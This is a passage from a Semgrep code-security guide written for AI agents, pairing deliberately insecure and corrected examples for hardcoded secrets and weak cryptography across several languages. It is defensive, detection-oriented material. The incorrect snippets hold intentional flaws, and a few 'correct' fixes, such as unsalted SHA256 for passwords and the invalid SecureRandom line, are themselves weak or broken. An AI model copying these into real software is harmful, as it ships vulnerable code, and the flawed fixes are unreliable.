# Code Security

**Version 0.1.0**  
Semgrep Engineering  
January 2026

> **Note:**  
> This document is mainly for agents and LLMs to follow when maintaining,  
> generating, or refactoring codebases with a focus on security best practices. Humans  
> may also find it useful, but guidance here is optimized for automation  
> and consistency by AI-assisted workflows.

---

## Abstract

Comprehensive code security guide, designed for AI agents and LLMs.

---

## Table of Contents

0. [Section 0](#0-section-0) — **HIGH**
   - 0.1 [Avoid Hardcoded Secrets](#01-avoid-hardcoded-secrets)
   - 0.2 [Avoid Insecure Cryptography](#02-avoid-insecure-cryptography)
   - 0.3 [Avoid Unsafe Functions](#03-avoid-unsafe-functions)
   - 0.4 [Code Best Practices](#04-code-best-practices)
   - 0.5 [Code Correctness](#05-code-correctness)
   - 0.6 [Code Maintainability](#06-code-maintainability)
   - 0.7 [Ensure Memory Safety](#07-ensure-memory-safety)
   - 0.8 [Performance Best Practices](#08-performance-best-practices)
   - 0.9 [Prevent Code Injection](#09-prevent-code-injection)
   - 0.10 [Prevent Command Injection](#010-prevent-command-injection)
   - 0.11 [Prevent Cross-Site Request Forgery](#011-prevent-cross-site-request-forgery)
   - 0.12 [Prevent Cross-Site Scripting (XSS)](#012-prevent-cross-site-scripting-xss)
   - 0.13 [Prevent Insecure Deserialization](#013-prevent-insecure-deserialization)
   - 0.14 [Prevent Path Traversal](#014-prevent-path-traversal)
   - 0.15 [Prevent Prototype Pollution](#015-prevent-prototype-pollution)
   - 0.16 [Prevent Race Conditions](#016-prevent-race-conditions)
   - 0.17 [Prevent Regular Expression DoS](#017-prevent-regular-expression-dos)
   - 0.18 [Prevent Server-Side Request Forgery](#018-prevent-server-side-request-forgery)
   - 0.19 [Prevent SQL Injection](#019-prevent-sql-injection)
   - 0.20 [Prevent XML External Entity (XXE) Injection](#020-prevent-xml-external-entity-xxe-injection)
   - 0.21 [Secure AWS Terraform Configurations](#021-secure-aws-terraform-configurations)
   - 0.22 [Secure Azure Terraform Configurations](#022-secure-azure-terraform-configurations)
   - 0.23 [Secure Docker Configurations](#023-secure-docker-configurations)
   - 0.24 [Secure GCP Terraform Configurations](#024-secure-gcp-terraform-configurations)
   - 0.25 [Secure GitHub Actions](#025-secure-github-actions)
   - 0.26 [Secure JWT Authentication](#026-secure-jwt-authentication)
   - 0.27 [Secure Kubernetes Configurations](#027-secure-kubernetes-configurations)
   - 0.28 [Use Secure Transport](#028-use-secure-transport)

---

## 0. Section 0

**Impact: HIGH**

### 0.1 Avoid Hardcoded Secrets

**Impact: CRITICAL**

Hardcoded credentials, API keys, tokens, and other secrets in source code pose a critical security risk. When secrets are committed to version control, they can be exposed to unauthorized parties through repository access, leaked in public repositories or through data breaches, difficult to rotate without code changes and redeployment, and discovered by automated secret scanning tools used by attackers. Always use environment variables, secret managers, or secure vaults to provide credentials at runtime.

**Incorrect: Python - hardcoded AWS credentials with boto3**

```python
import boto3
from boto3 import client

# ruleid:hardcoded-token
client("s3", aws_secret_access_key="jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx")

# ruleid:hardcoded-token
boto3.sessions.Session(aws_secret_access_key="jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx")

s = boto3.sessions
# ruleid:hardcoded-token
s.Session(aws_access_key_id="AKIAxxxxxxxxxxxxxxxx")

uhoh_key = "AKIAxxxxxxxxxxxxxxxx"
ok_secret = os.environ.get("SECRET_ACCESS_KEY")
# ruleid:hardcoded-token
s3 = boto3.resource(
    "s3",
    aws_access_key_id=uhoh_key,
    aws_secret_access_key=ok_secret,
    region_name="sfo2",
    endpoint_url="https://sfo2.digitaloceanspaces.com",
)

ok_key = os.environ.get("ACCESS_KEY_ID")

uhoh_secret = "jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx"
# ruleid:hardcoded-token
s3 = boto3.resource(
    "s3",
    aws_access_key_id=ok_key,
    aws_secret_access_key=uhoh_secret,
    region_name="sfo2",
    endpoint_url="https://sfo2.digitaloceanspaces.com",
)
```

**Correct: Python - AWS credentials from environment variables**

```python
import boto3
import os

# ok:hardcoded-token
key = os.environ.get("ACCESS_KEY_ID")
secret = os.environ.get("SECRET_ACCESS_KEY")
s3 = boto3.resource(
    "s3",
    aws_access_key_id=key,
    aws_secret_access_key=secret,
    region_name="sfo2",
    endpoint_url="https://sfo2.digitaloceanspaces.com",
)

# ok:hardcoded-token
s3 = client("s3", aws_access_key_id="this-is-not-a-key")

# ok:hardcoded-token - placeholder values
s3 = boto3.resource(
    "s3",
    aws_access_key_id="<your token here>",
    aws_secret_access_key="<your secret here>",
    region_name="us-east-1",
)
```

**Incorrect: Go - hardcoded AWS access token pattern**

```go
// ruleid: aws-access-token
AWS_api_token = "AKIALALEMEL33243OLIB"
```

**Correct: Go - AWS token from environment**

```go
// ok: aws-access-token
AWS_api_token = os.Getenv("AWS_ACCESS_KEY_ID")
```

**Incorrect: JavaScript - hardcoded JWT secret with jsonwebtoken**

```javascript
"use strict";

const config = require('./config')
const jsonwt = require('jsonwebtoken')

function example1() {
  const payload = {foo: 'bar'}
  const secret = 'shhhhh'
  // ruleid: hardcoded-jwt-secret
  const token1 = jsonwt.sign(payload, secret)
}

function example2() {
  const payload = {foo: 'bar'}
  // ruleid: hardcoded-jwt-secret
  const token2 = jsonwt.sign(payload, 'some-secret')
}

const Promise = require("bluebird");
const secret = "hardcoded-secret"
class Authentication {
    static sign(obj){
        // ruleid: hardcoded-jwt-secret
        return jsonwt.sign(obj, secret, {});
    }
}
```

**Correct: JavaScript - JWT secret from config or environment**

```javascript
const config = require('./config')
const jsonwt = require('jsonwebtoken')

function example3() {
  // ok: hardcoded-jwt-secret
  const payload = {foo: 'bar'}
  const token3 = jsonwt.sign(payload, config.secret)
}

function example4() {
  // ok: hardcoded-jwt-secret
  const payload = {foo: 'bar'}
  const secret2 = config.secret
  const token4 = jsonwt.sign(payload, secret2)
}

function example5() {
  // ok: hardcoded-jwt-secret
  const payload = {foo: 'bar'}
  const secret3 = process.env.SECRET
  const token5 = jsonwt.sign(payload, secret3)
}
```

**Incorrect: JavaScript - hardcoded express-jwt secret**

```javascript
var jwt = require('express-jwt');

// ruleid: express-jwt-hardcoded-secret
app.get('/protected', jwt({ secret: 'shhhhhhared-secret' }), function(req, res) {
    if (!req.user.admin) return res.sendStatus(401);
    res.sendStatus(200);
});

// ruleid: express-jwt-hardcoded-secret
let hardcodedSecret = 'shhhhhhared-secret'

app.get('/protected2', jwt({ secret: hardcodedSecret }), function(req, res) {

    if (!req.user.admin) return res.sendStatus(401);
    res.sendStatus(200);
});

let secret = "hardcode"

const opts = Object.assign({issuer: 'http://issuer'}, {secret: secret})

app.get('/protected3', jwt(opts), function(req, res) {
    if (!req.user.admin) return res.sendStatus(401);
    res.sendStatus(200);
});
```

**Correct: JavaScript - express-jwt secret from environment or config**

```javascript
var jwt = require('express-jwt');

// ok: express-jwt-hardcoded-secret
app.get('/ok-protected', jwt({ secret: process.env.SECRET }), function(req, res) {
    if (!req.user.admin) return res.sendStatus(401);
    res.sendStatus(200);
});


let configSecret = config.get('secret')
const opts = Object.assign({issuer: 'http://issuer'}, {secret: configSecret})

// ok: express-jwt-hardcoded-secret
app.get('/ok-protected', jwt(opts), function(req, res) {
    if (!req.user.admin) return res.sendStatus(401);
    res.sendStatus(200);
});
```

**Incorrect: TypeScript - hardcoded express-session secret**

```typescript
import express from 'express'
import session from 'express-session'
const app = express()

let a = 'a'
let config = {
  // ruleid: express-session-hardcoded-secret
  secret: 'a',
  resave: false,
  saveUninitialized: false,
}

app.use(session({
  // ruleid: express-session-hardcoded-secret
  secret: a,
  resave: false,
  saveUninitialized: false,
}));

app.use(session(config));

let secret2 = {
  resave: false,
  // ruleid: express-session-hardcoded-secret
  secret: 'foo',
  saveUninitialized: false,
}
app.use(session(secret2));
```

**Correct: TypeScript - express-session secret from config**

```typescript
import express from 'express'
import session from 'express-session'
const app = express()

let config1 = {
  // ok: express-session-hardcoded-secret
  secret: config.secret,
  resave: false,
  saveUninitialized: false,
}

app.use(session(config1));

app.use(session({
  // ok: express-session-hardcoded-secret
  secret: config.secret,
  resave: false,
  saveUninitialized: false,
}));
```

**Incorrect: Go - hardcoded jwt-go key**

```go
package main

import (
	"github.com/dgrijalva/jwt-go"
)

func Signin(w http.ResponseWriter, r *http.Request) {

	// Create the JWT key used to create the signature
	var jwtKey = []byte("my_secret_key")

	// Declare the token with the algorithm used for signing, and the claims
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	// ruleid: hardcoded-jwt-key
	tokenString, err := token.SignedString(jwtKey)
	// ruleid: hardcoded-jwt-key
	tokenString, err := token.SignedString([]byte("my_secret_key"))
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
}
```

**Correct: Go - JWT key from environment**

```go
package main

import (
	"os"
	"github.com/dgrijalva/jwt-go"
)

func Signin(w http.ResponseWriter, r *http.Request) {
	// ok: hardcoded-jwt-key - get secret from environment
	var jwtKey = []byte(os.Getenv("JWT_SECRET"))

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString(jwtKey)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
}
```

**Incorrect: Java - hardcoded java-jwt secret**

```java
package jwt_test.jwt_test_1;

import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTCreationException;

public class App
{

    static String secret = "secret";

    private static void bad1() {
        try {
            // ruleid: java-jwt-hardcoded-secret
            Algorithm algorithm = Algorithm.HMAC256("secret");
            String token = JWT.create()
                .withIssuer("auth0")
                .sign(algorithm);
        } catch (JWTCreationException exception){
            //Invalid Signing configuration / Couldn't convert Claims.
        }
    }
}

abstract class App2
{
// ruleid: java-jwt-hardcoded-secret
    static String secret = "secret";

    public void bad2() {
        try {
            Algorithm algorithm = Algorithm.HMAC256(secret);
            String token = JWT.create()
                .withIssuer("auth0")
                .sign(algorithm);
        } catch (JWTCreationException exception){
            //Invalid Signing configuration / Couldn't convert Claims.
        }
    }

}
```

**Correct: Java - JWT secret from parameter**

```java
package jwt_test.jwt_test_1;

import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTCreationException;

public class App
{

    private static void ok1(String secretKey) {
        try {
            // ok: java-jwt-hardcoded-secret
            Algorithm algorithm = Algorithm.HMAC256(secretKey);
            String token = JWT.create()
                .withIssuer("auth0")
                .sign(algorithm);
        } catch (JWTCreationException exception){
            //Invalid Signing configuration / Couldn't convert Claims.
        }
    }

    public static void main( String[] args )
    {
        ok1(args[0]);
    }
}
```

**Incorrect: Go - hardcoded GitHub personal access token**

```go
// ruleid: github-pat
github_api_token = "ghp_emmtytndiqky5a98w0s98w36vfhiz6f7ed4c"
```

**Correct: Go - GitHub token from environment**

```go
// ok: github-pat
github_api_token = os.Getenv("GITHUB_TOKEN")
```

**Incorrect: Go - hardcoded Stripe access token**

```go
// ruleid: stripe-access-token
stripeToken := "sk_test_20cbqx6v2hpftsbq203r36yqccazez"
```

**Correct: Go - Stripe token from environment**

```go
// ok: stripe-access-token
stripeToken := os.Getenv("STRIPE_SECRET_KEY")
```

**Incorrect: Go - hardcoded private key**

```go
// ruleid: private-key
[]string{`-----BEGIN PRIVATE KEY-----
anything
-----END PRIVATE KEY-----`,
		`-----BEGIN RSA PRIVATE KEY-----
abcdefghijklmnopqrstuvwxyz
-----END RSA PRIVATE KEY-----
`,
		`-----BEGIN PRIVATE KEY BLOCK-----
anything
-----END PRIVATE KEY BLOCK-----`,
	}
```

**Correct: Go - private key from file or environment**

```go
// ok: private-key - load from file or environment
privateKey, err := ioutil.ReadFile(os.Getenv("PRIVATE_KEY_PATH"))
if err != nil {
    log.Fatal(err)
}
```

**Incorrect: Ruby - hardcoded secrets**

```ruby
# ruleid: check-secrets
PASSWORD = "superdupersecret"
http_basic_authenticate_with :name => "superduperadmin", :password => PASSWORD, :only => :create
```

**Correct: Ruby - secrets from secure store**

```ruby
# ok: check-secrets
secret = get_from_store('somepass')
# ok: check-secrets
rest_auth_site_key = ""
```

**Incorrect: Ruby - hardcoded HTTP auth password in controller**

```ruby
class DangerousController < ApplicationController
  # ruleid:hardcoded-http-auth-in-controller
  http_basic_authenticate_with :name => "dhh", :password => "secret", :except => :index

  puts "do more stuff"

end
```

**Correct: Ruby - HTTP auth password from variable**

```ruby
# ok:hardcoded-http-auth-in-controller
class OkController < ApplicationController

  http_basic_authenticate_with :name => "dhh", :password => not_a_string, :except => :index

  puts "do more stuff"

end
```

**Incorrect: Python Flask - hardcoded SECRET_KEY**

```python
import os
import flask
app = flask.Flask(__name__)

# ruleid: avoid_hardcoded_config_SECRET_KEY
app.config.update(SECRET_KEY="aaaa")
# ruleid: avoid_hardcoded_config_SECRET_KEY
app.config["SECRET_KEY"] = '_5#y2L"F4Q8z\n\xec]/'
```

**Correct: Python Flask - SECRET_KEY from environment**

```python
import os
import flask
app = flask.Flask(__name__)

# ok: avoid_hardcoded_config_SECRET_KEY
app.config.update(SECRET_KEY=os.getenv("SECRET_KEY"))
# ok: avoid_hardcoded_config_SECRET_KEY
app.config.update(SECRET_KEY=os.environ["SECRET_KEY"])
```

**Incorrect: Python Django - empty password string**

```python
from models import UserProfile

def test_email_auth_backend_empty_password(user_profile: UserProfile) -> None:
    user_profile = example_user('hamlet')

    # ruleid: password-empty-string
    password = ""
    user_profile.set_password(password)
    user_profile.save()

    # ruleid: password-empty-string
    password = ''
    user_profile.set_password(password)
    user_profile.save()
```

**Correct: Python Django - non-empty password**

```python
from models import UserProfile

def test_email_auth_backend_empty_password(user_profile: UserProfile) -> None:
    user_profile = example_user('hamlet')
    # ok: password-empty-string
    password = "testpassword"
    user_profile.set_password(password)
    user_profile.save()
```

**Incorrect: Python JWT - exposed credentials in token payload**

```python
import jwt

# ruleid: jwt-python-exposed-credentials
payload = {'foo': 'bar','password': 123}

def bad1(secret, value):
    # ruleid: jwt-python-exposed-credentials
    encoded = jwt.encode({'some': 'payload','password': value}, secret, algorithm='HS256')
    return encoded

def bad3(secret, value):
    # ruleid: jwt-python-exposed-credentials
    pp = {'one': 'two','password': value}
    encoded = jwt.encode(pp, secret, algorithm='HS256')
    return encoded
```

**Correct: Python JWT - no credentials in token payload**

```python
import jwt

def ok(secret_key):
    # ok: jwt-python-exposed-credentials
    encoded = jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')
    return encoded
```

**Incorrect: Terraform - IAM credentials exposure**

```hcl
resource "aws_iam_policy" "policy" {
  name        = "test_policy"
  path        = "/"
  description = "My test policy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # ruleid: no-iam-creds-exposure
        Action = "sts:GetSessionToken"
        Effect   = "Allow"
        Resource = "*"
      },
    ]
  })
}

resource "aws_iam_policy" "policy" {
  name        = "test_policy"
  path        = "/"
  description = "My test policy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # ruleid: no-iam-creds-exposure
        Action = ["ec2:GetPasswordData"]
        Effect   = "Allow"
        Resource = "*"
      },
    ]
  })
}

data aws_iam_policy_document "policy" {
   statement {
     # ruleid: no-iam-creds-exposure
     actions = ["chime:CreateApiKey"]
     principals {
       type        = "AWS"
       identifiers = ["*"]
     }
     resources = ["*"]
   }
}
```

**Correct: Terraform - IAM policy without credentials exposure**

```hcl
resource "aws_iam_user_policy" "lb_ro" {
  name = "test"
  user = aws_iam_user.lb.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # ok: no-iam-creds-exposure
        Action = [
          "ec2:Describe*",
        ]
        Effect   = "Allow"
        Resource = "*"
      },
    ]
  })
}

data aws_iam_policy_document "policy" {
   statement {
     # ok: no-iam-creds-exposure
     actions = ["ec2:Describe"]
     resources = ["*"]
   }
}

resource "aws_iam_policy" "policy" {
  name        = "test_policy"
  path        = "/"
  description = "My test policy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # ok: no-iam-creds-exposure - Deny effect
        Action = ["ec2:GetPasswordData"]
        Effect   = "Deny"
        Resource = "*"
      },
    ]
  })
}

data aws_iam_policy_document "policy" {
   statement {
     # ok: no-iam-creds-exposure - Deny effect
     actions = ["chime:CreateApiKey"]
     principals {
       type        = "AWS"
       identifiers = ["*"]
     }
     resources = ["*"]
     effect = "Deny"
   }
}
```

### 0.2 Avoid Insecure Cryptography

**Impact: HIGH**

Using weak or broken cryptographic algorithms puts sensitive data at risk. Attackers can exploit known vulnerabilities in deprecated algorithms to decrypt data, forge signatures, or predict "random" values. Weak algorithms include MD5 and SHA1 for hashing (collision attacks are practical), DES/RC4/Blowfish for encryption (deprecated due to small key or block sizes), RSA keys below 2048 bits, ECB mode (reveals patterns), and non-cryptographic random number generators. CWE-327: Use of a Broken or Risky Cryptographic Algorithm. CWE-328: Use of Weak Hash. CWE-326: Inadequate Encryption Strength.

**Incorrect: Python - MD5 hashing**

```python
import hashlib

# Using MD5 for hashing
hashlib.md5(1)
hashlib.md5(1).hexdigest()
abc = str.replace(hashlib.md5("1"), "###")
print(hashlib.md5("1"))
foo = hashlib.md5(data, usedforsecurity=True)
```

**Incorrect: Python - SHA1 hashing**

```python
import hashlib

# Using SHA1 for hashing
hashlib.sha1(1)
```

**Incorrect: Python - SHA1 with cryptography library**

```python
from cryptography.hazmat.primitives import hashes

hashes.SHA1()
```

**Correct: Python - SHA256 hashing**

```python
import hashlib

# Using secure hash algorithm
hashlib.sha256(1)

# With cryptography library
from cryptography.hazmat.primitives import hashes
hashes.SHA256()
hashes.SHA3_256()
```

**Incorrect: Python - DES cipher**

```python
from Crypto.Cipher import DES as pycrypto_des
from Cryptodome.Cipher import DES as pycryptodomex_des

key = b'-8B key-'
plaintext = b'We are no longer the knights who say ni!'
nonce = Random.new().read(pycrypto_des.block_size/2)
ctr = Counter.new(pycrypto_des.block_size*8/2, prefix=nonce)
cipher = pycrypto_des.new(key, pycrypto_des.MODE_CTR, counter=ctr)
cipher = pycryptodomex_des.new(key, pycryptodomex_des.MODE_CTR, counter=ctr)
```

**Incorrect: Python - RC4/ARC4 cipher**

```python
from Crypto.Cipher import ARC4 as pycrypto_arc4
from Cryptodome.Cipher import ARC4 as pycryptodomex_arc4
from cryptography.hazmat.primitives.ciphers import algorithms

key = b'Very long and confidential key'
tempkey = SHA.new(key+nonce).digest()
cipher = pycrypto_arc4.new(tempkey)
cipher = pycryptodomex_arc4.new(tempkey)

# With cryptography library
cipher = Cipher(algorithms.ARC4(key), mode=None, backend=default_backend())
```

**Correct: Python - AES cipher**

```python
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key = b'Sixteen byte key'
cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)

# With cryptography library
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
```

**Incorrect: Python - ECB mode**

```python
from cryptography.hazmat.primitives.ciphers.modes import ECB

mode = ECB(iv)
```

**Correct: Python - CBC mode**

```python
from cryptography.hazmat.primitives.ciphers.modes import CBC

mode = CBC(iv)
```

**Incorrect: Python - weak RSA key size**

```python
from cryptography.hazmat.primitives.asymmetric import rsa

rsa.generate_private_key(public_exponent=65537,
                         key_size=1024,
                         backend=backends.default_backend())
```

**Correct: Python - strong RSA key size**

```python
from cryptography.hazmat.primitives.asymmetric import rsa

rsa.generate_private_key(public_exponent=65537,
                         key_size=2048,
                         backend=backends.default_backend())
```

**Incorrect: Python - JWT none algorithm**

```python
import jwt

encoded = jwt.encode({'some': 'payload'}, None, algorithm='none')
jwt.decode(encoded, None, algorithms=['none'])
```

**Correct: Python - JWT with proper algorithm**

```python
import jwt

encoded = jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')
```

**Incorrect: Java - MD5 hashing**

```java
import java.security.MessageDigest;

public byte[] bad1(String password) {
    MessageDigest md5Digest = MessageDigest.getInstance("MD5");
    md5Digest.update(password.getBytes());
    byte[] hashValue = md5Digest.digest();
    return hashValue;
}

java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
```

**Incorrect: Java - SHA1 hashing**

```java
import java.security.MessageDigest;
import org.apache.commons.codec.digest.DigestUtils;

MessageDigest sha1Digest = MessageDigest.getInstance("SHA-1");
sha1Digest.update(password.getBytes());

byte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());

java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA1", "SUN");
```

**Correct: Java - SHA-512 hashing**

```java
import java.security.MessageDigest;

MessageDigest sha512Digest = MessageDigest.getInstance("SHA-512");
sha512Digest.update(password.getBytes());
byte[] hashValue = sha512Digest.digest();
```

**Incorrect: Java - DES cipher**

```java
Cipher c = Cipher.getInstance("DES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, k, iv);

Cipher c = Cipher.getInstance("DES");
```

**Incorrect: Java - RC4 cipher**

```java
Cipher.getInstance("RC4");
useCipher(Cipher.getInstance("RC4"));
```

**Correct: Java - AES with GCM**

```java
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);

Cipher.getInstance("AES/CBC/PKCS7PADDING");
```

**Incorrect: Java - ECB mode**

```java
Cipher c = Cipher.getInstance("AES/ECB/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);
```

**Correct: Java - GCM mode**

```java
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);
```

**Incorrect: Java - weak RSA key size**

```java
import java.security.KeyPairGenerator;

KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
keyGen.initialize(512);
```

**Correct: Java - strong RSA key size**

```java
import java.security.KeyPairGenerator;

KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
keyGen.initialize(2048);
```

**Incorrect: Java - weak random number generator**

```java
float rand = new java.util.Random().nextFloat();
new java.util.Random().nextInt();
double value = java.lang.Math.random();
```

**Correct: Java - secure random**

```java
double value2 = java.security.SecureRandom();
```

**Incorrect: Java - weak SSL context**

```java
SSLContext ctx = SSLContext.getInstance("SSL");
SSLContext ctx = SSLContext.getInstance("TLS");
SSLContext ctx = SSLContext.getInstance("TLSv1");
SSLContext ctx = SSLContext.getInstance("SSLv3");
SSLContext ctx = SSLContext.getInstance("TLSv1.1");
```

**Correct: Java - secure TLS version**

```java
SSLContext ctx = SSLContext.getInstance("TLSv1.2");
SSLContext ctx = SSLContext.getInstance("TLSv1.3");
```

**Incorrect: JavaScript - weak pseudo-random bytes**

```javascript
// Using pseudoRandomBytes which is not cryptographically secure
crypto.pseudoRandomBytes
```

**Correct: JavaScript - secure random bytes**

```javascript
// Using cryptographically secure random bytes
crypto.randomBytes
```

**Incorrect: JavaScript - MD5 for password hashing**

```javascript
const crypto = require("crypto");

function ex1(user, pwtext) {
    digest = crypto.createHash("md5").update(pwtext).digest("hex");
    user.setPassword(digest);
}
```

**Correct: JavaScript - SHA256 for password hashing**

```javascript
const crypto = require("crypto");

function ok1(user, pwtext) {
    digest = crypto.createHash("sha256").update(pwtext).digest("hex");
    user.setPassword(digest);
}
```

**Incorrect: JavaScript - JWT none algorithm**

```javascript
const jose = require("jose");
const { JWK, JWT } = jose;
const token = JWT.verify('token-here', JWK.None);
```

**Correct: JavaScript - JWT with proper key**

```javascript
const jose = require("jose");
const { JWK, JWT } = jose;
const token = JWT.verify('token-here', secretKey);
```

**Incorrect: Go - MD5 hashing**

```go
import (
    "crypto/md5"
    "fmt"
    "io"
)

func test_md5() {
    h := md5.New()
    if _, err := io.Copy(h, f); err != nil {
        log.Fatal(err)
    }
    fmt.Printf("%x", md5.Sum(nil))
}
```

**Incorrect: Go - SHA1 hashing**

```go
import (
    "crypto/sha1"
    "fmt"
    "io"
)

func test_sha1() {
    h := sha1.New()
    if _, err := io.Copy(h, f); err != nil {
        log.Fatal(err)
    }
    fmt.Printf("%x", sha1.Sum(nil))
}
```

**Incorrect: Go - DES cipher**

```go
import "crypto/des"

func test_des() {
    ede2Key := []byte("example key 1234")
    var tripleDESKey []byte
    tripleDESKey = append(tripleDESKey, ede2Key[:16]...)
    tripleDESKey = append(tripleDESKey, ede2Key[:8]...)
    _, err := des.NewTripleDESCipher(tripleDESKey)
}
```

**Incorrect: Go - RC4 cipher**

```go
import "crypto/rc4"

func test_rc4() {
    key := []byte{1, 2, 3, 4, 5, 6, 7}
    c, err := rc4.NewCipher(key)
    dst := make([]byte, len(src))
    c.XORKeyStream(dst, src)
}
```

**Incorrect: Go - weak RSA key size**

```go
import (
    "crypto/rand"
    "crypto/rsa"
)

pvk, err := rsa.GenerateKey(rand.Reader, 1024)
```

**Correct: Go - strong RSA key size**

```go
import (
    "crypto/rand"
    "crypto/rsa"
)

pvk, err := rsa.GenerateKey(rand.Reader, 2048)
```

**Incorrect: Go - weak random number generator**

```go
import mrand "math/rand"
import mrand "math/rand/v2"
```

**Correct: Go - secure random**

```go
import "crypto/rand"

good, _ := rand.Read(nil)
```

**Incorrect: Ruby - MD5 hashing**

```ruby
require 'digest'

md5 = Digest::MD5.hexdigest 'abc'
md5 = Digest::MD5.new
md5 = Digest::MD5.base64digest 'abc'
md5 = Digest::MD5.digest 'abc'

digest = OpenSSL::Digest::MD5.new
digest = OpenSSL::Digest::MD5.hexdigest 'abc'
digest = OpenSSL::Digest::MD5.base64digest 'abc'
digest = OpenSSL::Digest::MD5.digest 'abc'
```

**Incorrect: Ruby - SHA1 hashing**

```ruby
require 'digest'

sha = Digest::SHA1.hexdigest 'abc'
sha = Digest::SHA1.new
sha = Digest::SHA1.base64digest 'abc'
sha = Digest::SHA1.digest 'abc'

digest = OpenSSL::Digest::SHA1.new
digest = OpenSSL::Digest::SHA1.hexdigest 'abc'
OpenSSL::HMAC.hexdigest("sha1", key, data)
```

**Correct: Ruby - SHA256 hashing**

```ruby
require 'digest'

digest = OpenSSL::Digest::SHA256.new
digest = OpenSSL::Digest::SHA256.hexdigest 'abc'
OpenSSL::HMAC.hexdigest("SHA256", key, data)

user.set_password Digest::SHA256.hexdigest pwtext
```

**Incorrect: Ruby - MD5 for password hashing**

```ruby
require 'digest'

def ex1 (user, pwtext)
    user.set_password Digest::MD5.hexdigest pwtext
end

def ex2 (user, pwtext)
    md5 = Digest::MD5.new
    md5.update pwtext
    md5 << salt(pwtext)
    dig = md5.hexdigest
    user.set_password dig
end
```

**Correct: Ruby - SHA256 for password hashing**

```ruby
require 'digest'

def ok1 (user, pwtext)
    user.set_password Digest::SHA256.hexdigest pwtext
end

def ok2 (user, pwtext)
    sha = Digest::SHA256.new
    sha.update pwtext
    sha << salt(pwtext)
    dig = sha.hexdigest
    user.set_password dig
end
```

**Incorrect: Ruby - weak RSA key size**

```ruby
class Test
    $key = 512
    @key2 = 512

    OpenSSL::PKey::RSA.new(@key2)
    OpenSSL::PKey::RSA.new 512
    key = OpenSSL::PKey::RSA.new($key)
end
```

**Correct: Ruby - strong RSA key size**

```ruby
class Test
    $pass1 = 2048
    @pass2 = 2048

    key = OpenSSL::PKey::RSA.new($pass1)
    key = OpenSSL::PKey::RSA.new(@pass2)
    key = OpenSSL::PKey::RSA.new(2048)
end
```

**Incorrect: Kotlin - MD5 hashing**

```kotlin
import java.security.MessageDigest
import org.apache.commons.codec.digest.DigestUtils

public fun md5(password: String): ByteArray {
    val md5Digest: MessageDigest = MessageDigest.getInstance("MD5")
    md5Digest.update(password.getBytes())
    val hashValue: ByteArray = md5Digest.digest()
    return hashValue
}

public fun md5_digestutil(password: String): ByteArray {
    val hashValue: ByteArray = DigestUtils.getMd5Digest().digest(password.getBytes())
    return hashValue
}
```

**Incorrect: Kotlin - SHA1 hashing**

```kotlin
import java.security.MessageDigest
import org.apache.commons.codec.digest.DigestUtils

var sha1Digest: MessageDigest = MessageDigest.getInstance("SHA1")
var sha1Digest: MessageDigest = MessageDigest.getInstance("SHA-1")
val hashValue: Array<Byte> = DigestUtils.getSha1Digest().digest(password.getBytes())
```

**Correct: Kotlin - SHA256 hashing**

```kotlin
import java.security.MessageDigest

val sha256Digest: MessageDigest = MessageDigest.getInstance("SHA256")
sha256Digest.update(password.getBytes())
val hashValue: ByteArray = sha256Digest.digest()
```

**Incorrect: Kotlin - ECB mode**

```kotlin
class ECBCipher {
  public fun ecbCipher(): Void {
    val c: Cipher = Cipher.getInstance("AES/ECB/NoPadding")
    c.init(Cipher.ENCRYPT_MODE, k, iv)
    val cipherText = c.doFinal(plainText)
  }

  public fun ecbCipher2(): Void {
    var c = Cipher.getInstance("AES/ECB/NoPadding")
    c.init(Cipher.ENCRYPT_MODE, k, iv)
    val cipherText = c.doFinal(plainText)
  }
}
```

**Correct: Kotlin - GCM mode**

```kotlin
class ECBCipher {
  public fun noEcbCipher(): Void {
    var c = Cipher.getInstance("AES/GCM/NoPadding")
    c.init(Cipher.ENCRYPT_MODE, k, iv)
    val cipherText = c.doFinal(plainText)
  }
}
```

**Incorrect: Kotlin - weak RSA key size**

```kotlin
import java.security.KeyPairGenerator

fun rsaWeak(): Void {
    val keyGen: KeyPairGenerator = KeyPairGenerator.getInstance("RSA")
    keyGen.initialize(512)
}
```

**Correct: Kotlin - strong RSA key size**

```kotlin
import java.security.KeyPairGenerator

fun rsaOK(): Void {
    val keyGen = KeyPairGenerator.getInstance("RSA");
    keyGen.initialize(2048);
}
```

**Incorrect: C# - DES or RC2 cipher**

```csharp
using System.Security.Cryptography;

public void CreateDES1() {
    var key = DES.Create();
}

public void CreateDES2() {
    var key = DES.Create("ImplementationName");
}

public void CreateRC21() {
    var key = RC2.Create();
}

